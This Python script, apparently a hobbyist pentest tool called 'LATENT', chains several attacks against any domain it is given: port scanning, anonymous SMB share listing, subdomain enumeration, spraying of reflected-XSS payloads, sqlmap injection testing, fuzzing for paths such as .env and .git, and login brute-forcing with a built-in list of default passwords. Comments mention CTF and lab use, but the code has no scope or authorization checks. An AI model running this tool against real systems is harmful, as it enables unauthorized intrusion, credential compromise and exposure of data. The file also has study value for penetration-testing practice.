#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import json
import time
import argparse
import asyncio
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
from colorama import Fore, Style, init

# Optional deps degrade gracefully if missing
try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

try:
    import whois
except ImportError:
    whois = None

try:
    import aiodns
except ImportError:
    aiodns = None

# Kill SSL warning spam; we intentionally hit self-signed certs in labs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
HEADERS = {"User-Agent": USER_AGENT}
TIMEOUT = 10

# Quick-hit wordlists for fast recon. These paths yield the highest
# impact during short engagements without burning time on full brute.
COMMON_DIRS = [
    # Admin / panels
    "/admin", "/admin/login", "/admin.php", "/administrator",
    "/login", "/signin", "/auth", "/auth/login",
    "/dashboard", "/panel", "/controlpanel", "/cp",

    # APIs
    "/api", "/api/v1", "/api/v2", "/api/admin", "/graphql",
    "/rest", "/swagger", "/swagger-ui", "/docs", "/openapi.json",

    # Config / leaks
    "/config", "/config.php", "/settings", "/settings.php",
    "/.env", "/.env.backup", "/.env.local",
    "/debug", "/debug.log", "/error.log",

    # Source / backup / git leakage
    "/.git", "/.git/config", "/.git/HEAD",
    "/backup", "/backups", "/backup.zip", "/site.zip",
    "/dump.sql", "/database.sql", "/db.sql",

    # CMS specific
    "/wp-admin", "/wp-login.php", "/wp-content",
    "/administrator", "/joomla", "/user/login",

    # Common exposed services
    "/phpmyadmin", "/pma", "/mysql",
    "/server-status", "/status",

    # Dev / staging environments
    "/dev", "/development", "/staging", "/test",
    "/testing", "/old", "/beta", "/demo",

    # Misc high-value endpoints
    "/console", "/shell", "/terminal",
    "/upload", "/uploads", "/files",
    "/tmp", "/temp",

    # Security / interesting files
    "/robots.txt", "/sitemap.xml",
    "/crossdomain.xml", "/security.txt",

    # CI/CD / infra
    "/jenkins", "/gitlab", "/ci", "/ci/cd",
    "/kibana", "/grafana", "/prometheus",

    # Hidden / uncommon but useful
    "/hidden", "/secret", "/private",
    "/internal", "/intranet"
]

# Mix of tag-based, event-based, and protocol handlers to catch
# different filter levels and output contexts.
XSS_PAYLOADS = [
    # Classic script injection
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",

    # Broken tag / escape bypass
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "</title><script>alert(1)</script>",

    # Image / media event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=invalid onerror=confirm(1)>",
    "<img src=x onerror=prompt(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",

    # HTML body / element events
    "<body onload=alert(1)>",
    "<body onmouseover=alert(1)>",
    "<div onmouseover=alert(1)>X</div>",
    "<input onfocus=alert(1) autofocus>",

    # JavaScript URI
    "javascript:alert(1)",
    "javascript:confirm(1)",
    "javascript:prompt(1)",

    # Attribute breaking
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",

    # Encoded / filter bypass attempts
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src=x%20onerror=alert(1)%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",

    # Polyglot style payloads
    "'\"><svg/onload=alert(1)>",
    "\"><img/src=x/onerror=alert(1)>",
    "\"><iframe src=javascript:alert(1)>",

    # Template injection-ish hybrids (sometimes reflected contexts)
    "${alert(1)}",
    "{{alert(1)}}",
    "<%= alert(1) %>",

    # DOM heavy payloads
    "<script>document.body.innerHTML='XSS'</script>",
    "<script>eval('alert(1)')</script>"
]

# Covers WordPress, Joomla, Django, and generic custom panels.
LOGIN_PATHS = [
    "/login", "/admin", "/wp-login.php", "/administrator",
    "/user/login", "/signin", "/auth", "/panel"
]

COMMON_USERS = ["admin", "root", "user", "test", "administrator", "guest"]


class Logger:
    """Unified console + file logger with color support."""
    def __init__(self, report_file=None):
        self.report_file = report_file

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        color = {
            "INFO": Fore.CYAN,
            "WARN": Fore.YELLOW,
            "FAIL": Fore.RED,
            "OK": Fore.GREEN,
            "PHASE": Fore.MAGENTA
        }.get(level, Fore.WHITE)
        line = f"[{ts}] [{level}] {msg}"
        print(f"{color}{line}{Style.RESET_ALL}")
        if self.report_file:
            self.report_file.write(line + "\n")

    def phase(self, text):
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"  {Fore.MAGENTA}{text}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        if self.report_file:
            self.report_file.write(f"\n{'='*60}\n  {text}\n{'='*60}\n")


class RateLimiter:
    """Polite delay between requests to avoid nuking the target."""
    def __init__(self, delay=0.5):
        self.delay = delay
        self.last = 0

    def sleep(self):
        # Adaptive sleep: only pause if the last request was too recent.
        # This preserves throughput when the network itself is slow.
        elapsed = time.time() - self.last
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self.last = time.time()

def resolve_domain(target):
    """Extract clean hostname from URL or raw domain input."""

    if "://" not in target:
        target = "http://" + target

    parsed = urlparse(target)

    host = parsed.netloc if parsed.netloc else parsed.path

    # remove credentials if any (user:pass@host)
    if "@" in host:
        host = host.split("@")[-1]

    # remove port
    if ":" in host:
        host = host.split(":")[0]

    return host.strip().lower()

def fetch_html(domain, logger, session):
    """Phase 1: Probe HTTP/HTTPS variants and fingerprint stack."""
    logger.phase("PHASE 1: HTML FETCH & TECH FINGERPRINT")
    # Try both bare and www variants; many CTF boxes listen only on one.
    variants = [f"http://{domain}", f"https://{domain}",
                f"http://www.{domain}", f"https://www.{domain}"]

    for url in variants:
        try:
            logger.log(f"Trying {url} ...")
            r = session.get(url, timeout=TIMEOUT, headers=HEADERS)
            logger.log(f"HTTP {r.status_code} - {len(r.text)} bytes", "OK")

            path = f"{domain}_index.html"
            with open(path, "w", encoding="utf-8") as f:
                f.write(r.text)
            logger.log(f"Saved: {path}", "OK")

            tech = fingerprint_tech(r)
            logger.log(f"Tech: {tech}")
            return r.text, path, tech
        except Exception as e:
            logger.log(f"Failed: {url} -> {e}", "WARN")

    logger.log("HTML fetch failed.", "FAIL")
    return None, None, {}


def fingerprint_tech(response):
    """Extract Server headers, missing security headers, and CMS hints."""
    tech = {}
    h = response.headers
    if "Server" in h:
        tech["server"] = h["Server"]
    if "X-Powered-By" in h:
        tech["powered_by"] = h["X-Powered-By"]

    # Flag missing hardening headers; useful for quick win reporting
    missing = []
    for hdr in ["X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options", "Strict-Transport-Security"]:
        if hdr not in h:
            missing.append(hdr)
    if missing:
        tech["missing_headers"] = missing

    # CMS fingerprinting via body content; faster than external DB lookups.
    txt = response.text.lower()
    if "wp-content" in txt or "wordpress" in txt:
        tech["cms"] = "WordPress"
    elif "drupal" in txt:
        tech["cms"] = "Drupal"
    elif "joomla" in txt:
        tech["cms"] = "Joomla"
    elif "django" in txt:
        tech["cms"] = "Django"

    return tech


def scan_port_single(args):
    """Worker: TCP connect with short timeout to keep throughput high."""
    domain, port = args
    try:
        # Context manager guarantees socket cleanup even under load.
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # 0.5s is the sweet spot on LAN/CTF networks: accurate yet fast.
            s.settimeout(0.5)
            if s.connect_ex((domain, port)) == 0:
                try:
                    svc = socket.getservbyport(port, "tcp")
                except (OSError, ValueError):
                    svc = "unknown"
                return (port, svc)
    except Exception:
        pass
    return None


def scan_ports(domain, max_port, logger, threads=150):
    """Phase 2: ThreadPool port sweep. 150 workers hits 1000 ports in ~10s."""
    logger.phase("PHASE 2: PORT SCAN")
    open_ports = []
    ports = list(range(1, max_port + 1))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port_single, (domain, p)): p for p in ports}
        iterator = as_completed(futures)
        if tqdm:
            iterator = tqdm(iterator, total=len(ports), desc="Ports", ncols=70)

        for f in iterator:
            res = f.result()
            if res:
                port, svc = res
                logger.log(f"OPEN {port}/{svc}", "OK")
                open_ports.append(res)

    logger.log(f"Found {len(open_ports)} open ports")
    return sorted(open_ports)


def smb_probe(domain, logger):
    """Phase 3: Check 139/445 and attempt anonymous share listing."""
    logger.phase("PHASE 3: SMB PROBE")
    smb_ports = [139, 445]
    found = []
    for port in smb_ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                if s.connect_ex((domain, port)) == 0:
                    logger.log(f"SMB port {port} OPEN", "OK")
                    found.append(port)
        except Exception:
            pass

    if found:
        logger.log("SMB detected. Consider enum4linux.", "WARN")
        try:
            out = subprocess.run(
                ["smbclient", "-L", f"//{domain}/", "-N"],
                capture_output=True, text=True, timeout=10
            )
            if out.stdout:
                logger.log("SMB shares retrieved")
                return out.stdout
        except Exception as e:
            logger.log(f"smbclient failed: {e}", "WARN")
    else:
        logger.log("SMB ports closed")
    return None


def subdomain_sync(domain, wordlist, logger, limit):
    """Fallback sync resolver when aiodns is unavailable."""
    logger.phase("PHASE 4: SUBDOMAIN ENUM (sync)")
    found = []
    count = 0

    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            subs = []
            for line in f:
                sub = line.strip()
                # Filter out invalid entries: empty lines, comments, lines with invalid chars
                if (sub and not sub.startswith("#") and 
                    sub.replace("-", "").replace("_", "").isalnum() and
                    not sub.startswith(".") and not sub.endswith(".") and
                    len(sub) > 0):
                    subs.append(sub)
    except Exception as e:
        logger.log(f"Wordlist error: {e}", "FAIL")
        return found

    if limit > 0:
        subs = subs[:limit]

    logger.log(f"Testing {len(subs)} subdomains...")
    
    for sub in tqdm(subs, desc="Subdomains", ncols=70) if tqdm else subs:
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            logger.log(f"FOUND {full} -> {ip}", "OK")
            found.append((full, ip))
            count += 1
        except (socket.gaierror, UnicodeEncodeError):
            pass
        if limit > 0 and count >= limit:
            break

    logger.log(f"Total subdomains: {len(found)}")
    return found


async def subdomain_async(domain, wordlist, logger, limit):
    """Async DNS resolver: 10x faster than sequential gethostbyname."""
    logger.phase("PHASE 4: SUBDOMAIN ENUM (async)")
    found = []
    resolver = aiodns.DNSResolver()

    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            subs = []
            for line in f:
                sub = line.strip()
                # Filter out invalid entries: empty lines, comments, lines with invalid chars
                if (sub and not sub.startswith("#") and 
                    sub.replace("-", "").replace("_", "").isalnum() and
                    not sub.startswith(".") and not sub.endswith(".") and
                    len(sub) > 0):
                    subs.append(sub)
    except Exception as e:
        logger.log(f"Wordlist error: {e}", "FAIL")
        return found

    if limit > 0:
        subs = subs[:limit]

    logger.log(f"Testing {len(subs)} subdomains...")

    async def query(sub):
        full = f"{sub}.{domain}"
        try:
            result = await resolver.query(full, "A")
            return full, result[0].host
        except Exception:
            return None

    tasks = [query(s) for s in subs]
    for coro in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Subdomains") if tqdm else asyncio.as_completed(tasks):
        res = await coro
        if res:
            logger.log(f"FOUND {res[0]} -> {res[1]}", "OK")
            found.append(res)

    logger.log(f"Total subdomains: {len(found)}")
    return found


def xss_probe(domain, logger, session, limiter):
    """Phase 5: Reflected XSS detection with context-aware validation."""
    logger.phase("PHASE 5: XSS PROBE ( uzun sürebilir )")
    pages = [
        f"http://{domain}", f"https://{domain}",
        f"http://{domain}/search", f"http://{domain}/contact",
        f"http://{domain}/login"
    ]
    hits = 0

    for page in pages:
        try:
            limiter.sleep()
            r = session.get(page, timeout=5, headers=HEADERS)
            # Skip pages with no input surface to save cycles.
            # XSS without a form or input field is usually not exploitable via GET reflection.
            if "<form" not in r.text.lower() and "input" not in r.text.lower():
                continue

            for payload in XSS_PAYLOADS:
                try:
                    limiter.sleep()
                    # Spray multiple param names because we don't know the backend key.
                    test = f"{page}?q={payload}&search={payload}&id={payload}"
                    r2 = session.get(test, timeout=5, headers=HEADERS)
                    if payload in r2.text:
                        ctx = check_context(r2.text, payload)
                        logger.log(f"XSS REFLECTED [{ctx}]: {test}", "WARN")
                        hits += 1
                except Exception:
                    pass
        except Exception:
            pass

    logger.log(f"XSS tests done. Reflected: {hits}")
    return hits


def check_context(html, payload):
    """Determine injection context to estimate exploitability."""
    idx = html.find(payload)
    if idx == -1:
        return "none"
    window = html[max(0, idx-40):idx+len(payload)+40]
    if f"<script>{payload}" in window or f"<script>{payload}</script>" in window:
        return "script"
    if "=" in window and (window.count('"') % 2 == 1 or window.count("'") % 2 == 1):
        return "attr"
    return "html"


def sqlmap_probe(domain, logger):
    """Phase 6: SQLMap wrapper with tamper and quick-batch flags."""
    logger.phase("PHASE 6: SQLMAP INTEGRATION")
    targets = [f"http://{domain}", f"https://{domain}"]

    for url in targets:
        logger.log(f"SQLMap -> {url}")
        cmd = [
            "sqlmap", "-u", url, "--batch", "--random-agent",
            "--level", "2", "--risk", "2", "--threads", "4",
            "--time-sec", "5", "--output-dir", f"./sqlmap_{domain}",
            "--tamper", "space2comment"
        ]
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if out.stdout:
                with open(f"{domain}_sqlmap.txt", "w") as f:
                    f.write(out.stdout)
                if "vulnerable" in out.stdout.lower() or "injectable" in out.stdout.lower():
                    logger.log("SQL INJECTION DETECTED!", "FAIL")
                    return True
                logger.log("No obvious SQLi found")
                return False
        except subprocess.TimeoutExpired:
            logger.log("SQLMap timeout", "WARN")
        except FileNotFoundError:
            logger.log("sqlmap not installed", "FAIL")
        except Exception as e:
            logger.log(f"SQLMap error: {e}", "WARN")
    return False


def dir_fuzz(domain, logger, session, limiter):
    """Phase 7: Short common-path burst to find exposed panels and backups."""
    logger.phase("PHASE 7: DIRECTORY FUZZING")
    found = []
    for path in COMMON_DIRS:
        for proto in ["http", "https"]:
            url = f"{proto}://{domain}{path}"
            try:
                limiter.sleep()
                # Disable redirects to catch 301/302 as distinct findings.
                # Following them would hide the existence of the protected endpoint.
                r = session.get(url, timeout=8, headers=HEADERS, allow_redirects=False)
                if r.status_code in (200, 301, 302, 401, 403):
                    logger.log(f"[{r.status_code}] {url}", "OK" if r.status_code == 200 else "WARN")
                    found.append((url, r.status_code, len(r.text)))
            except Exception:
                pass
    logger.log(f"Found {len(found)} interesting paths")
    return found


def brute_login(domain, wordlist, logger, session, limiter):
    """Phase 8: Baseline-aware brute force to reduce false positives."""
    logger.phase("PHASE 8: LOGIN BRUTE-FORCE")
    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()][:100]
    except Exception:
        passwords = ["123456", "123456789", "1234", "12345", "12345678", "password", "password1", "passw0rd", "pass123", "admin", "admin123", "administrator", "root", "toor", "guest", "qwerty", "qwerty123", "qwerty1", "asdfgh", "zxcvbn", "1q2w3e4r", "1q2w3e", "qwertyuiop", "111111", "000000", "121212", "123123", "654321", "7777777", "987654321", "112233", "letmein", "welcome", "login", "changeme", "default", "secret", "access", "test", "test123", "adminadmin", "admin1", "admin1234", "root123", "toor123", "ubuntu", "debian", "linux", "oracle", "mysql", "password123", "admin2024", "admin2025", "rootroot", "pass1234", "welcome123", "login123", "ctf123", "hackthebox", "tryhackme", "pentest", "security"]

    candidates = []
    for path in LOGIN_PATHS:
        url = f"http://{domain}{path}"
        try:
            limiter.sleep()
            baseline = session.get(url, timeout=5, headers=HEADERS)
            base_len = len(baseline.text)
        except Exception:
            continue

        for user in COMMON_USERS:
            for pwd in passwords[:10]:
                try:
                    limiter.sleep()
                    # Multi-key payload strategy: WordPress uses log/pwd,
                    # generic forms use username/password. Sending both keys
                    # maximizes compatibility without probing the form first.
                    data = {"username": user, "password": pwd, "log": user, "pwd": pwd}
                    r = session.post(url, data=data, timeout=5, headers=HEADERS, allow_redirects=False)

                    if is_success(r, base_len):
                        logger.log(f"CREDENTIALS? {user}:{pwd} @ {url}", "WARN")
                        candidates.append((url, user, pwd))
                except Exception:
                    pass

    logger.log(f"Brute-force finished. Candidates: {len(candidates)}")
    return candidates


def is_success(response, baseline_len):
    """Distinguish success from failure via redirects, keywords, and length delta."""
    if response.status_code in (301, 302, 303):
        return True
    text = response.text.lower()
    if any(k in text[:800] for k in ["dashboard", "welcome", "logout", "admin panel", "profile"]):
        return True
    # Length delta > 25% and no error keywords suggests a different page (possible success)
    if abs(len(response.text) - baseline_len) > baseline_len * 0.25 and len(response.text) > 200:
        if not any(k in text[:500] for k in ["error", "invalid", "wrong", "failed", "incorrect"]):
            return True
    return False


def whois_lookup(domain, logger):
    """Phase 9: Registrar and contact intelligence."""
    logger.phase("PHASE 9: WHOIS")
    if not whois:
        logger.log("python-whois not installed", "WARN")
        return None
    try:
        w = whois.whois(domain)
        logger.log(f"Registrar: {w.registrar}")
        logger.log(f"Creation: {w.creation_date}")
        logger.log(f"Emails: {w.emails}")
        return {
            "registrar": str(w.registrar),
            "creation": str(w.creation_date),
            "emails": str(w.emails)
        }
    except Exception as e:
        logger.log(f"WHOIS failed: {e}", "WARN")
        return None


def build_report(data, path):
    """Dump structured JSON for downstream tooling."""
    with open(path, "w", encoding="utf-8") as f:
        # default=str handles datetime objects that JSON can't serialize natively.
        json.dump(data, f, indent=2, default=str)


def main():
    parser = argparse.ArgumentParser(description="LATENT - Multi-Phase Pentest Tool")
    parser.add_argument("-t", "--target", required=True, help="Target domain or URL")
    parser.add_argument("-w", "--wordlist", default="/home/whoami/codesx/subdomains.txt",
                        help="Subdomain/wordlist path")
    parser.add_argument("-p","--ports", type=int, default=1000, help="Max port to scan")
    parser.add_argument("--threads", type=int, default=150, help="Port scan thread count")
    parser.add_argument("--sub-limit", type=int, default=50, help="Subdomain limit (0=all)")
    parser.add_argument("--rate", type=float, default=0.3, help="Inter-request delay in seconds")
    parser.add_argument("--brute", action="store_true", help="Enable login brute-force")
    parser.add_argument("--sqlmap", action="store_true", help="Enable SQLMap integration")
    parser.add_argument("--no-color", action="store_true", help="Disable terminal colors")
    parser.add_argument("--json", action="store_true", help="Emit JSON report alongside TXT")
    args = parser.parse_args()

    if args.no_color:
        import colorama
        colorama.deinit()

    domain = resolve_domain(args.target)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_txt = f"latent_report_{domain}_{ts}.txt"
    report_json = f"latent_report_{domain}_{ts}.json"

    print(f"""
{Fore.CYAN}===============================================================
                     LATENT - IM JUST A ANONYMOUS
                         v0.2.1 | Multi-Phase
===============================================================
{Style.RESET_ALL}""")

    with open(report_txt, "w", encoding="utf-8") as rf:
        logger = Logger(rf)
        # Reuse TCP connections across phases to reduce overhead.
        session = requests.Session()
        session.headers.update(HEADERS)
        limiter = RateLimiter(args.rate)

        logger.log(f"Target: {domain}")
        logger.log(f"Wordlist: {args.wordlist}")
        logger.log(f"MaxPort: {args.ports} | Threads: {args.threads} | Rate: {args.rate}s")

        html, html_path, tech = fetch_html(domain, logger, session)
        open_ports = scan_ports(domain, args.ports, logger, args.threads)
        smb_data = smb_probe(domain, logger)

        # Prefer async DNS when available; fallback keeps the tool portable.
        if aiodns:
            found_subs = asyncio.run(subdomain_async(domain, args.wordlist, logger, args.sub_limit))
        else:
            found_subs = subdomain_sync(domain, args.wordlist, logger, args.sub_limit)

        xss_hits = xss_probe(domain, logger, session, limiter)
        dirs = dir_fuzz(domain, logger, session, limiter)
        whois_data = whois_lookup(domain, logger)

        sqlmap_result = False
        if args.sqlmap:
            sqlmap_result = sqlmap_probe(domain, logger)

        brute_results = []
        if args.brute:
            brute_results = brute_login(domain, args.wordlist, logger, session, limiter)

        summary = {
            "target": domain,
            "timestamp": ts,
            "html_saved": html_path,
            "technology": tech,
            "open_ports": open_ports,
            "smb_shares": smb_data,
            "subdomains": found_subs,
            "xss_reflected": xss_hits,
            "directories": dirs,
            "whois": whois_data,
            "sqlmap_vulnerable": sqlmap_result,
            "brute_candidates": brute_results
        }

        if args.json:
            build_report(summary, report_json)
            logger.log(f"JSON report: {report_json}", "OK")

        logger.phase("SUMMARY")
        logger.log(f"Open Ports: {len(open_ports)}")
        logger.log(f"Subdomains: {len(found_subs)}")
        logger.log(f"XSS Reflected: {xss_hits}")
        logger.log(f"Interesting Paths: {len(dirs)}")
        logger.log(f"Brute Candidates: {len(brute_results)}")
        logger.log(f"TXT Report: {report_txt}", "OK")

    print(f"\n{Fore.GREEN}[*] Done. Report: {report_txt}{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal: {e}{Style.RESET_ALL}")
        sys.exit(1)
